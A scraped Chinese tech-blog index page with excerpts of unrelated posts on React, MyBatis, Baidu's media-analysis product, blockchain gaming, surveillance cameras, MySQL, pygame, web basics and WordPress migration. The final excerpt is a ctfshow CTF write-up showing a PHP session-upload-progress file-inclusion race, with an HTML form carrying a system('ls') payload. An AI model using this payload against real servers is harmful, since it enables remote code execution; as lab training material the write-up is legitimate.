const getApi = async () =&gt; { const res = await fetch('https://api.chucknorris.io/jokes/random') return res.json() } export default function Index() { const [api, setApi] = useState(null) const [list, setList] = useState([]) function __clickToGetMessage() { setApi(getApi()) } return ( &lt;div&gt; &lt;div id='tips'&gt;点击按钮新增一条数据，该数据从接口中获取&lt;/div&gt; &lt;button onClick={__clickToGetMessage}&gt;新增数据&lt;/button&gt; &lt;div className="content"&gt; &lt;div className="list"&gt; {list.map((item, index) =&gt; { return &lt;div className='item' key={item}&gt;{item}&lt;/div&gt; })} &lt;/div&gt; &lt;Suspense fallback={&lt;div&gt;loading...&lt;/div&gt;}&gt; &lt;Item api={api} setList={setList} /&gt; &lt;/Suspense&gt; &lt;/div&gt; &lt;/div&gt; ) } const Item = ({api, setList}) =&gt; { const [show, setShow] = useState(true) const joke = api ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69c11c2d30964e5b67cce2e2e75bf495/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22667a64e6ed50c038cc2358b1e5220f/" rel="bookmark">
			学java的第3天 后端商城小程序工作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.数据库的大坑 特殊字段名 ’我的图片表中有一个字段是描述我写成desc了，正好是mysql中的关键字 就不能使用了
2.后端编写 2.1可以把请求分开
在商品浏览页中 只显示商品的大致信息 当用户再点击其他按钮时在发出请求
2.2把请求合并 把数据整合到一起 利用association 和 collection 表示 2.2.1association 多对一 &lt;association property="categories" javaType="com.hrmy.entity.Categories"&gt; &lt;id property="id" column="id"/&gt; &lt;result property="parentId" column="parent_id"/&gt; &lt;result property="name" column="name"/&gt; &lt;result property="createdAt" column="created_at"/&gt; &lt;result property="updatedAt" column="update_at"/&gt; &lt;/association&gt; 2.2.2collection 一对多
2.3遇到的问题 collection中需要ofType 3.一个框框实现条件模糊查找 @Data @AllArgsConstructor @NoArgsConstructor public class ProductSearchVo { //商品名称 private String productSearchVo; } @ApiOperation(value = "根据商品名字模糊查询商品") @GetMapping("{nameAndId}") public Result queryByNameAndId(@ApiParam(value = "商品或者id模糊查询商品") ProductSearchVo productSearchVo) { return productsService.queryByNameAndId(productSearchVo); } &lt;select id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22667a64e6ed50c038cc2358b1e5220f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4639cbe5c98b6d0f837425a61265b2de/" rel="bookmark">
			百度云智能媒体内容分析一体机（MCA）建设
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导读 ：本文主要介绍了百度智能云MCA产品的概念和应用。
媒体信息海量且复杂，采用人工的方式对视频进行分析处理，面临着效率低、成本高的困难。于是，MCA应运而生。它基于百度自研的视觉AI、ASR、NLP技术，为用户提供音视频、图片、文本的内容分析能力，实现标签提取、智能封面提取、高光片段分析等功能。
01 背景与目标 对于涉及广电新闻、娱乐社交等UGC、AIGC的企业来说，有效地收集、整理、分析和呈现视频内容，不仅能帮助企业在竞争中拔得头筹，还有利于做出更优的业务决策。可是，这会面临一些挑战：
标签要覆盖大量业务场景，否则就需要建设多个数据集，不易于统计和分析；
分析维度应支持自由配置，否则无法满足个性化的业务需求；
支持分析不同格式的媒体内容，同时，处理视频的速度要快。
百度智能云媒体内容分析（Media Content Analysis），就是为了帮助企业提高内容分析的效率、缩减平台的人力成本，而建设的一体机产品：
MCA将AI技术落地于媒体行业内容分析场景，可以助力企业内容推荐与搜索业务发展，赋能媒体行业，助力产业升级。
02 技术方案 根据公开信息可知，MCA的定位是“实现智能媒体内容分析的一体机产品”，用户可以选择公有云或私有化的部署方式，自定义配置内容分析的维度，并呈现可视化的分析结果。
AI技术托底（大模型）：MCA借助百度强大的 AI 技术、沉淀已久的海量级数据，针对视频场景进行专门的优化，可以达到最优的识别效果。
影视综知识图谱（业内领先）：根据影视剧/综艺类视频的场景、人脸、标题等内容，推理返回剧集名称、别称、演员表、一句话简介、上映时间、地点等信息，帮助补充视频标签。
公众人脸库（专业）：基于百度百科的海量人脸数据，收录了领导人、艺术家、影视明星、体育明星、社会活动家等国内外公众人物，总数量超70万。
召回率提升（高效）：对比人工浏览视频内容标注出的视频标签的数量，使用视频内容分析MCA的结构化标签数量提升了10倍左右，能够准确描述视频中的细节内容、提升视频的搜全率。
2.1 整体架构 按照功能划分，MCA的层级架构如图所示：
业务系统的核心功能如图所示：
MCA产品的主要功能如下：
a. 智能视频标签：为视频文件或直播流的内容打标签，可输出视频的场景、公众人物、地点、实体和关键词等结构化标签信息；
b. 智能图片标签：对图片内容进行打标签，可输出图片中公众人物、logo、实体和关键词等结构化标签信息；
c. 智能封面：通过对视频、图像等内容理解，从图像清晰度、构图美学和精彩程度等方面分析，生成视频的静态封面、动态封面、视频封面；
d. 精彩视频分析：通过场景切分、音频特征分析等技术，提取影视综长视频中的高光时刻。
2.2 技术实现的细节阐释 登录百度智能云平台官网，进入“一念 &gt; 内容分析”产品页面。
2.2.1 智能标签 登录成功、进入产品页面后，进入智能标签 &gt; 视频内容分析，点击“创建视频内容分析”，创建分析任务。
MCA支持三种视频导入方式：本地文件导入、BOS 地址导入、在线地址导入。
输入限制：
文件格式：3gpp、asf/wmv、avi、flv/f4v、mkv、mov/mp4/m4a、mp3、mp2、mpeg/mpg、ts/ogg、mts、wmv/wma、rm/rmvb、webm等；
视频编码标准：H.264、H.263/H.263+、MPEG-1/2/4、VP8/9、Quicktime、RealVideo、WMV、MJPEG等；
音频编码标准：MP1、MP2、MP3、AAC、AC-3、WMA、PCM、ADPCM、AMR、RealAudio、Vorbis、DSD等；
分析时长6小时以内，分辨率大于30X30；
分析视频的audio、video编码信息须至少存在一个，不能为空；
可批量上传音视频文件，最多可同时上传20个文件。
分析过程中可以看到分析状态（排队中→分析中→分析完成/分析失败）。如果分析失败，可以将鼠标移到分析失败旁边的图标上查看失败原因。若分析完成，则可查看分析结果。
点击分析完成视频的“查看详情”按钮，即可查看视频分析的结果.
右侧的页签可以查看不同维度的中间分析结果，下侧为标签提取结果。
2.2.2 智能封面 开启后，系统将结合清晰度、人脸、构图、场景识别等特征信息，综合输出视频中适合做封面的图片。
点击智能封面分析，进入智能封面分析页面。
点击创建智能封面分析，创建分析任务。
分析过程中可以看到分析状态（排队中→分析中→分析完成/分析失败）。
点击分析完成视频的“查看详情”按钮，即可查看视频的封面结果。
2.2.3 精彩视频分析 登录成功、进入产品页面后，点击精彩视频分析，进入精彩视频分析页面。
点击创建精彩视频分析，创建分析任务。
分析过程中可以看到分析状态（排队中→分析中→分析完成）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4639cbe5c98b6d0f837425a61265b2de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/370fcae20962861c97b8a777611b97d2/" rel="bookmark">
			2024 年 6 月区块链游戏研报：Pixels 引发 DAU 波动，行业用户留存率差异显著
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：Stella L (stella@footprint.network) 数据来源：区块链游戏研究页面
2024 年 6 月，加密货币市场遭遇显著回调，比特币跌幅达 7.3%，以太坊更是下跌了 9.8%。此番波动不可避免地波及区块链游戏领域，导致游戏代币市场总值缩水 28.1%。此外，区块链游戏的日交易笔数增长了 8.0%， 但每日活跃用户数（DAU）却减少了 8.8%，回落至 300万。行业的重要动态包括围绕 Web3 游戏未来的广泛讨论、Ronin 宣布即将推出其 Layer 2，以及 Pixels 和 Matr1x FIRE 等游戏中用户参与度的显著变化。随着区块链游戏行业的不断演进，其核心关注点始终在于利用区块链技术打造可持续且引人入胜的游戏体验。
本报告数据来自 Footprint Analytics 的区块链游戏研究页面。这是一个易于使用的仪表板，包含了解区块链游戏行业最重要的统计数据和指标，并实时更新。
宏观市场回顾 6 月期间，加密货币市场遭遇了回调。比特币价格自月初的 67,730 美元滑落至月底的 62,795 美元，跌幅 7.3%。以太坊价格同样下跌，从月初的 3,820 美元下跌至月底的 3,444 美元，降幅为 9.8%。
数据来源：比特币和以太坊价格走势
来自多方面的持续抛售压力对比特币造成了沉重打击。6 月 24 日，Mt. Gox 破产清算受托人宣布，比特币及比特币现金（BCH）的偿付工作将于 2024 年 7 月启动，此举引发了市场对于债权人将资产转换为法币及其具体时间表的广泛不确定性。与此同时，美国现货比特币 ETF 在 6 月下半月出现了资金净流出的现象。
政府层面的举措同样不容忽视。德国一政府机构开始清算 2013 年没收的比特币，并于 6 月向交易所转移了近 4,000 枚比特币。同时，美国政府也将从一名被定罪的毒贩的钱包中查获的 3,940 枚比特币转移至 Coinbase。
尽管美国市场的现货以太坊 ETF 进展顺利，但比特币的疲软似乎蔓延到了整个加密市场。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/370fcae20962861c97b8a777611b97d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3ea848fabc57b76f055e2e0d063edae/" rel="bookmark">
			ACM ICPS独立出版 | 2024年第三届计算与人工智能国际会议（ISCAI 2024）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		会议简介 Brief Introduction
2024年第三届计算与人工智能国际会议(ISCAI 2024)
会议时间：2024年11月22 -24日
召开地点：中国·大理
大会官网：www.iscai.org
2024年第三届计算与人工智能国际会议(ISCAI 2024)将围绕“计算与人工智能”的最新研究领域而展开，为研究人员、工程师、专家学者以及行业专业人士提供一个交流与探讨最新研究成果的平台，并为与会者们交流新的思想和应用经验建立业务或研究关系。本次会议将于2024年11月22至24日在中国大理召开，在会议期间您将有机会聆听到行业前沿的学术报告，见证该领域的成果与进步。现热忱欢迎从事相关技术研究的专家学者及学生踊跃投稿并参加本次会议。
重要信息 Highlights
截稿时间：2024年10月20日
录用通知：投稿后两周内
检索信息：Ei Compendex＆Scopus双检索
出版信息 Publication
所有被大会接收的论文将收录至会议在线论文集并提交至ACM International Conference Proceedings Series(ICPS) 进行出版, ISBN: 979-8-4007-1067-4，见刊后提交至EI Compendex, Scopus等主流数据库检索。优秀论文将被推荐至国际期刊上发表。
推荐期刊 Recommended Journal
Computer Methods in Applied Mechanics and Engineering (Chinese Academy of Sciences Q1; ISSN: 1879-2138, IF: 7.2; indexed in SCI, EI and Scopus)
Structural and Multidisciplinary Optimization (Chinese Academy of Sciences Q2; ISSN: 1615-1488, IF: 3.9; indexed in SCIE, EI and Scopus)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f3ea848fabc57b76f055e2e0d063edae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fcc3b2195491fc749ad7e1563f57a76/" rel="bookmark">
			从海上长城到数字防线：视频技术在海域边防现代化中的创新应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着全球化和科技发展的加速，海域安全问题日益凸显其重要性。海域边防作为国家安全的第一道防线，其监控和管理面临着诸多挑战。近年来，视频技术的快速发展为海域边防场景提供了新的解决方案，其高效、实时、远程的监控特点极大地提升了海域安全防控水平。
一、视频技术在海域边防场景的应用现状 在海域边防场景中，视频技术已经得到了广泛应用。通过高清摄像头、红外热成像仪、智能分析系统等设备的配合，实现对海域的全天候、全方位监控。视频监控系统不仅能够实时监测海域内的船舶动态、人员活动等情况，还能够自动识别异常行为，为边防部门提供及时、准确的情报支持。
二、视频技术在海域边防场景中的创新应用 1）视频汇聚与管理
安防监控系统EasyCVR视频汇聚管理平台，依托已经建成的4G/5G、无线/有线网络覆盖，可将部署在重点区域的监控设备统一集中接入，可兼容IPC、NVR、巡检机器人、无人机、无人船等设备，通过多样化的监控手段对海岛海域海岸线进行24小时全面可视化监管。
视频汇聚EasyCVR安防综合监控平台特点如下：
视频汇聚管理：智慧安防监控EasyCVR视频管理平台能在复杂的网络环境中，将前端监控设备统一集中接入与汇聚管理；多协议接入：支持国标GB/T 28181协议、部标JT808、GA/T 1400协议、RTMP、RTSP/Onvif协议、海康Ehome、海康SDK、大华SDK、华为SDK、宇视SDK、乐橙SDK、萤石云SDK等；24小时监控：支持7*24小时实时高清视频监控，能同时播放多路监控视频流，视频画面1、4、9、16个可选，支持自定义视频轮播；视频传输：支持H.264/H.265视频压缩技术，可在4G/5G/WIFI/有线等网络环境下，传输720P/1080P/2K/4K高清视频；流媒体分发：能对外分发RTMP、RTSP、HTTP-FLV、WebSocket-FLV、HLS、WebRTC、ws-fmp4、http-fmp4等视频流，支持在多终端设备上观看；录像回放与存储：支持视频录像、存储、回放功能，可通过调阅视频录像查看现场事发经过，将视频录像作为追溯责任的证据；GIS地图：可根据设备的地理位置信息，在地图上实现可视化、空间化点位布局展示、调阅视频；系统运维管理：具备权限/用户/角色管理、设备分级分组管理、鉴权管理、服务器集群、操作日志、运维插件等管理能力。拓展性：平台提供标准的API接口，方便进行开发和集成。 2）智能识别与预警
传统的海域监控主要依赖于人工观察，效率低下且容易遗漏重要信息。而视频技术结合人工智能算法，能够实现对海域内目标的智能识别与预警。例如，通过图像识别技术，系统能够自动识别出非法越界、非法采砂、违规捕鱼、人员溺水等危险事件，并自动触发预警机制，提醒边防部门及时采取措施。
TSINGSEE青犀AI算法平台具备以下算法：
区域闯入检测：AI智能算法平台支持对水库、河流、湖泊等划定警戒区域，对违法进入警戒区的人员进行检测和预警。船只检测：智能AI算法平台可识别停靠或行驶在河道、湖面、海洋的各种常见类型的船只（捕捞船、挖沙船、货运船、载客船等）， 如有捕鱼船进入管辖区域，也会发出告警，还能对区域内船只数量进行统计。水体变色：支持对河流区域的水体是否被污染进行识别，包括明显的水体颜色变化，有害藻类生物入侵等。水面异常漂浮物：支持识别江河湖泊、水库、鱼塘等水域表面存在的异常漂浮物，包括水面垃圾、塑料、水葫芦、水藻、凌汛等。 3）远程监控与指挥
海域边防场景往往地处偏远，传统的监控方式难以实现实时、高效的指挥调度。而视频技术通过远程传输和实时显示，使得边防部门能够实时掌握海域内的情况，并进行远程指挥调度。这不仅提高了工作效率，还降低了人力成本。
4）多源信息融合
海域边防场景中的信息来源多种多样，包括雷达、红外、可见光等多种数据。视频技术通过多源信息融合技术，能够将各种数据进行有机融合，提高监控的准确性和可靠性。同时，多源信息融合还能够为边防部门提供更加全面的情报支持，帮助其更好地应对各种复杂情况。
三、设备选型 1）长波红外镜头
长波红外镜头具有超强的夜视能力，即便在光线极其微弱的环境下，也能捕捉到清晰的目标图像。这使得边防部队能够在夜间或恶劣天气条件下，依然能够实时监控边境线上的动态，有效预防和打击非法越境行为。
具备超远的探测距离和高分辨率的成像能力。通过高精度的图像处理技术，边防人员可以清晰地辨认出目标的具体特征和行动轨迹，从而作出迅速而准确的判断和反应。
2）光电跟踪云台监控球机
在海域边防场景中，光电跟踪云台监控球机发挥了重要作用。其配备了高倍数变焦镜头，能够在远距离内进行清晰的监控，提高了监控范围和效果。
光电跟踪云台监控球机具有高清画质，能够提供清晰、细腻的视频图像，有利于及时发现和识别监控目标。同时，它还具有自动跟踪功能，可以自动识别目标并进行跟踪，提高了监控的效率和准确性。这种监控设备在各种复杂的环境条件下都能保持较高的可靠性，为海域边防提供了稳定的监控支持。
3）可见光监控镜头
在海域边防领域，可见光监控镜头在白天或光线充足的条件下，能够提供更加清晰、色彩真实的画面。这有助于边防部队在白天时段更准确地监控海域情况。可见光监控镜头在夜间也能通过智能补光技术实现清晰稳定的夜视效果，从而扩展了其在海域边防场景中的应用时间。
四、海防视频监控系统的意义 通过海防视频监控系统，可以实现对海域的全天候、全方位监控，及时发现海上违法活动、意外事件和安全隐患。这有助于提升海域的安全性，减少海上事故和犯罪活动。 视频监控系统还可以帮助边防部门加强对海域边境线的监控，有效防范非法越界、偷渡等行为，维护国家边境安全。 此外，视频监控系统还可以监测海域内的资源开发活动，确保合法的渔业、海洋石油和天然气开发等活动的安全和有序进行，防止非法捕捞和资源破坏行为。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7adf26d30e166e08a6ffe3eff3fa2b48/" rel="bookmark">
			Mysql——子查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		子查询
Where子查询 单行单列 多行单列
Form子查询 多行多列
查询比SMITH工资高的人
select * from emp where sal &gt; (select sal from emp where ename = 'SMITH');
查询比平均工资高的人
select * from emp where sal &gt; (select avg(sal) from emp);
查询和经理工资相同的员工信息
select * from emp where sal in (select sal from emp where job = 'MANAGER');
查询部门编号，部门位置，部门人数，部门平均工资
第一步：查询每个部门的编号，名称，位置
Dept d
第二步：统计部门人数，平均工资
emp e
e.deptno deptno, count(e.empno) num,avg(e.sal) sal
Group by e.deptno
select e.deptno deptno, count(e.empno) num,avg(e.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7adf26d30e166e08a6ffe3eff3fa2b48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f5b5edbb4d88d659fd4471bd4bd5a72/" rel="bookmark">
			Python -- 利用pygame库进行游戏开发基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是pygame Pygame是一个基于Python的游戏开发库，它提供了一系列的工具和接口，使开发人员能够轻松地创建各种类型的游戏，包括2D游戏和简单的3D游戏，主要是为了开发2D游戏而生。具有免费、开源,支持多种操作系统，具有良好的跨平台性等优点。
在开始学习Pygame之前，您需要先安装Pygame库。您可以通过以下命令在命令行中安装
pip install pygame 输入以下代码检测pygame是否安装成功
import pygame pygame.ver 二、基本屏幕设置使用方法 pygame基本使用模块 模块名功能pygame.cdrom访问光驱pygame.cursors加载光标pygame.display访问显示设备pygame.draw绘制形状、线和点pygame.event管理事件pygame.font使用字体pygame.image加载和存储图片pygame.joystick使用游戏手柄或类似的东西pygame.key读取键盘按键pygame.mixer声音pygame.mouse鼠标pygame.movie播放视频pygame.music播放音乐pygame.overlay访问高级视频叠加pygame.rect管理矩形区域pygame.sndarray操作声音数据pygame.sprite操作移动图像pygame.surface管理图像和屏幕pygame.surfarray管理点阵图像数据pygame.time管理时间和帧信息pygame.transform缩放和移动图像 模块的具体使用方法 1、pygame概括化使用流程 （1）pygame.init()初始化 pygame.init() 是 Pygame 库中的初始化函数，它用于初始化 Pygame 的各种子模块和设置，以准备创建游戏或图形应用程序。调用 pygame.init() 的目的是确保 Pygame 环境正确准备好，以便在程序中使用 Pygame 的各种功能。
这个函数通常在程序的开始处调用，以确保 Pygame 能够正常工作。在调用 pygame.init() 之后，你可以使用 Pygame 的各种模块来处理图形、音频、事件等。例如，你可以创建游戏窗口、加载图像、播放音频等操作。
一旦初始化完成，你可以开始使用 Pygame 编写游戏逻辑并启动游戏循环。请注意，一旦初始化完成，你也可以通过 pygame.quit() 来清理 Pygame 环境和资源，通常是在程序结束时使用，以确保资源被正确释放。
初始化时显示
pygame.init() pygame.init()：该代码是整个程序的第一句代码，它的作用是自动检测Pygame软件包是否正常，并完成包括display(显卡模块)，font(字体模块)，mixer(声音模块)，cursors(光标控制模块)等的模块的初始化
pygame.display.set_mode()：创建一个窗口或屏幕，其大小由(width, height)指定，width表示窗口宽度，height代表屏幕高度。这个函数返回一个Surface对象，代表了整个屏幕。
（2）创建一个Surface对象 Surface是Pygame的编程窗口，像一个画布一样，能在上面进行显示，图像和文本能显示在Surface上
（1）创建Surface对象 screen = pygame.display.set_mode((800, 600)) （2）创建一个带文本的页面 # 设置字体 f = pygame.font.Font(None, 36) # 创建包含文字的Surface对象 text = f.render("简单的Pygame窗口", True, (255, 255, 255), (0, 0, 0)) # 获取文本的大小并创建一个合适的Rect textRect = text.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f5b5edbb4d88d659fd4471bd4bd5a72/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd7ac9a3dffa711a7aaebbc50f1007de/" rel="bookmark">
			Web基础与HTTP协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Web基础
Web基础知识，包含域名的概念，DNS原理，静态网页和动态网页的相关知识。
一、1 域名和 DNS
1.域名的概念
网络是基于 TCP/IP 协议进行通信和连接的，每一台主机都有一个唯一的标识(固定的IP地址)，用以区别在网络上成千上万个用户和计算机。网络在区分所有与之相连的网络和主机时，均采用一种唯一、通用的地址格式，即每一个与网络相连接的计算机和服务器都被指派一个独一无二的地址。为了保证网络上每台计算机的IP 地址的唯一性，用户必须向特定机构申请注册，分配IP地址。网络中的地址方案分为两套:IP地址系统和域名地址系统。这两套地址系统其实是一一对应的关系。IP地址用二进制数来表示，每个 IP 地址长 32 比特，由4个小于 256 的数字组成，数字之间用点间隔,例如 100.10.0.1 表示一个 IP 地址。由于 IP 地址是数字标识，使用时难以记忆和书写,因此在 IP 地址的基础上又发展出一种符号化的地址方案，来代替数字型的IP 地址。每一个符号化的地址都与特定的IP地址对应，这样网络上的资源访问起来就容易得多了。这个与网络上的数字型 IP 地址相对应的字符型地址，就被称为域名。通俗的说，域名就相当于一个家庭的门牌号码，别人通过这个号码可以很容易地找到你。
(1)域名的结构
以一个常见的域名为例说明其结构。图中，www.baidu.com 网址是由二部分组成，标号“baidu"是这个域名的主体，而最后的标号“com"则是该域名的后缀，代表的这是一个" com "国际域名，是顶级域名，而前面的www是主机名。
DNS 规定,域名中的标号都由英文字母和数字组成,每一个标号不超过 63个字符也不区分大小写字母。标号中除连字符(-)外不能使用其他的标点符号。级别最低的域名写在最左边，而级别最高的域名写在最右边。由多个标号组成的完整域名总共不超过 255 个字符。
一些国家也纷纷开发使用采用本民族语言构成的域名，如德语，法语等。中国也开始使用中文域名，但可以预计的是，在中国国内今后相当长的时期内，以英语为基础的域名(即英文域名)仍然是主流。
(2)域名结构类型
根域:指的是根服务器，要用来管理互联网的主目录，全世界只有13台。1个为主根服务器，放置在美国。其余 12个均为辅根服务器，其中9个放置在美国;欧洲2个，位于英国和瑞典;亚洲1个，位于日本。所有根服务器均由美国政府授权的互联网域名与号码分配机构ICANN 统一管理，负责全球互联网域名根服务器、域名体系和 IP 地址等的管理。顶级域:包括组织域和国家/地区域名。域名的最右侧是国家/地区域名，国家代码由两个字母组成的如.cn,.uk,.de 和.jp，其中.cn 是中国专用的顶级域名。在国家/地区域名左侧，是组织域名，常见的.com 用于商业机构，.net用于网络组织，.org用于各种组织包括非盈利组织。二级域名:在顶级域名之前的域名，在顶级域名前面，它是指域名注册人的网上名称，例如 baidu,ibm，yahoo，microsoft等。FQDN:是主机名.DNS后缀,是指主机名加上全路径，全路径中列出了序列中所有域成员。全域名可以从逻辑上准确地表示出主机在什么地方，也可以说全域名是主机名的一种完全表示形式。从全域名中包含的信息可以看出主机在域名树中的位置。 2.Hosts 文件
Hosts 文件是一个用于存储计算机网络中节点信息的文件，它可以将主机名映射到相应的 IP 地址，实现 DNS 的功能，它可以由计算机的用户进行修改控制。
(1)Hosts 文件的作用
在网络上访问网站，要首先通过 DNS 服务器把要访问的域名解析成 IP地址后，计算机才能对这个网络域名作网站进行访问。
对于每个域名请求，如果都要等待域名服务器解析后返回IP信息，那么访问网络的效率就会降低，因为 DNS 做域名解析和返回 IP 都需要时间。为了提高对经常访问的网络域名的解析效率，可以通过利用在 Hosts 文件中建立域名和IP 的映射关系来达到目的。根据系统规定，在进行DNS请求以前，系统会先检查自己的Hosts 文件中是否有这个网络域名映射关系。如果有则调用这个!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd7ac9a3dffa711a7aaebbc50f1007de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c9f59546f9ff58b6bd9eb9f8ba3f1c9/" rel="bookmark">
			六个步骤轻松将网站从Webflow迁移到WordPress
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		尽管Webflow和WordPress在网站构建方法上有显著差异，但将网站从 Webflow 迁移到 WordPress 并没有想象中那么复杂。
本教程将逐步指导您完成迁移过程，确保你的网站可以顺利从Webflow过渡到功能更加齐全的WordPress上。
迁移前的准备工作
在开始迁移网站之前，您需要完成以下两项准备工作：
购买用于托管WordPress网站的主机或者服务器
备份Webflow网站
以下是完成这两个重要步骤的方法：
购买WordPress主机
选择托管服务商时，重要的是要明确自己的需求，然后寻找能够满足这些需求的公司。例如，小型网站可以选择便宜的虚拟主机，而流量较大的网站则需要更多资源，可能需要VPS或者独立服务器。
不管是虚拟主机还是VPS或者独立服务器，您都可以在Hostease找到合适的方案。通常虚拟主机都会提供免费的SSL证书，这一点您可以先和服务商进行确认，据我了解，但将网站从 Webflow 迁移到 WordPress 并没有想象中那么复杂。
备份Webflow网站
在迁移之前，对网站做一个备份，确保在出现意外的情况下我们始终有一份可以还原的数据副本。
Webflow到WordPress迁移步骤：
步骤1：从Webflow导出网站
（1）登录到Webflow的控制台，找到CMS Collections，这里包含了储存在Webflow服务器上的所有站点文件，如图：
选择需要导出的内容集合，然后点击页面顶部的“Import”按钮：
通过这一步，我们可以将内容集导出为CSV文件，用于后续在WordPress中导入。
通过这种方式，您可以下载Webflow网站的大部分组件，但部分组件（如自定义CSS、图片等）无法自动导出，还需手动或通过插件将这些组件添加或上传到您的WordPress网站。
步骤2：在主机上安装WordPress
如果您选择的是Hostease这样支持一键安装WordPress的服务商，那么这一步就会变得非常简单，您只需要登录到主机的控制面板（例如cPanel面板），一键轻松安装WordPress。
即便您的主机商不提供WordPress一键安装，也无需担心，手动安装WordPress并不复杂，您也可以联系服务商的支持，让他们协助您完成安装，大部分的服务商应该都可以协助您完成这一步骤。
安装WordPress软件后，访问登录页面（例如：your-temp-domain.com/wp-login.php*）并使用安装过程中设置的用户名和密码登录到您的站点仪表盘。
步骤3：将内容从Webflow导入到WordPress
这一步操作我们需要用到一个名为WP All Import的迁移插件，以将Webflow .csv文件导入到您的WordPress网站。
插件安装完成之后，WordPress左侧的菜单中会出现一个名为“ All Import”的选项，点击此选项，进入插件页面，然后选择“Upload a file”按钮来上传CSV文件，然后在“New Items”的下拉选项中选择“Posts”，如图：
将Webflow文件数据与网站的相应部分进行匹配。
例如您导入的是博客文章，需要匹配以下内容：
标题和正文
图片
自定义字段
分类法、类别、标签
其他文章选项（文章状态、日期、评论）
功能编辑器
以标题和正文为例，需要将博客的标题和正文从右侧拖动到左侧对应的位置，如图：
步骤4：将图片导入到WordPress
导入图片需要用到一个名为Auto Upload Images的插件。
激活后，该插件会自动搜索您的文章和页面中的图片URL，下载图片，然后将图片URL替换为实际图片。
步骤5：配置WordPress永久链接
设置永久链接对SEO十分重要，您可以在WordPress仪表盘&gt;&gt;设置&gt;&gt;固定链接结构中设置或调整。
通常推荐文章名称作为URL结构，如图：
除了设置永久链接外，您还需要设置URL重定向，例如您在Webflow站点上的页面URL是：https://www.example.com/post/best-dog-food/ 迁移到WordPress后，相应的页面URL是：https://www.example.com/best-dog-food/ 您需要将Webflow页面重定向到新的WordPress URL。
可以使用专用的重定向插件（如Redirection和301 Redirects）或SEO插件（如Yoast和RankMath）实现重定向。
步骤6：更新DNS设置
迁移完成之后，您需要将域名解析指向到新的主机或者服务器上。
步骤7：检查是否有失效的链接或错误
断开的链接会影响用户体验，并且会影响搜索引擎优化（SEO）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c9f59546f9ff58b6bd9eb9f8ba3f1c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1a5529e52beff3a3baf40dfeed7fe02/" rel="bookmark">
			ctfshow-web入门-文件包含（web82-web86）条件竞争实现session会话文件包含
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、web82
2、web83
3、web84
4、web85
5、web86
1、web82 新增过滤点 . ，查看提示：利用 session 对话进行文件包含，通过条件竞争实现。
条件竞争这个知识点在文件上传、不死马利用与查杀这些里面也会涉及，如果大家不熟悉条件竞争可以先看看我之前的博客在文件上传中的介绍：
wzsc_文件上传（条件竞争）_竞争条件文件上传-CSDN博客
大致说一下这道题的利用点：
我们在 Cookie 里设置了 PHPSESSID=test，PHP 将会在服务器上创建一个文件：/tmp/sess_test，但是对于默认配置 session.upload_progress.cleanup = on，文件上传后 session 文件内容会立即被清空，我们需要通过条件竞争，在服务器还未来得及删除我们上传的session 文件内容前，成功访问包含到该文件，实现恶意代码的命令执行。
首先我们写一个关于这道题的文件上传框：
内容如下：
注意替换为你自己题目的地址，并将文件命名为 .html 后缀，双击即可打开，其中 value="&lt;?php system('ls'); ?&gt;" 其实就是我们的 payload，即我们希望执行的恶意代码。
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;form action="https://84202b35-60d0-4bd2-bee2-781631694f2c.challenge.ctf.show//" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="&lt;?php system('ls'); ?&gt;" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" value="submit" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php session_start(); ?&gt; 双击打开页面，开启 burpsuite 拦截本地请求，随便选一个文件上传提交：
使用 burpsuite 抓包，抓到后发给攻击模块：
	</div>
	<div class="list__footer clearfix">
